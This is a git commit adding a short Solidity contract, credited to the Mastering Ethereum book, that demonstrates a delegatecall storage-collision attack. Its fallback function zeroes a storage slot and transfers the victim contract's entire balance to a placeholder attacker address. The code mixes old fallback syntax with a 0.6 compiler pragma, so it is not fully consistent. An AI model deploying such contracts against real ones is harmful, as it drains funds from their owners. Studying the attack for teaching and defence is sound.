224a1f757f6bb70bd965f8ff28781130e9a8bcd9
samirasrh <Samira.Briongos.extern@srh-hochschulen.de>
2024-11-13 10:15:06 +0100

    Update AttackF.sol

--- AttackF.sol
+++ AttackF.sol
@@ -1,1 +1,15 @@
+//Example from the Mastering Ethereum book
+// Version of Solidity compiler this program was written for
+pragma solidity ^0.6.4;
 
+contract Attack {
+    uint storageSlot0; // corresponds to fibonacciLibrary
+    uint storageSlot1; // corresponds to calculatedFibNumber
+
+    // fallback - this will run if a specified function is not found
+    function() public {
+        storageSlot1 = 0; // we set calculatedFibNumber to 0, so if withdraw
+        // is called we don't send out any ether
+        <attacker_address>.transfer(this.balance); // we take all the ether
+    }
+ }
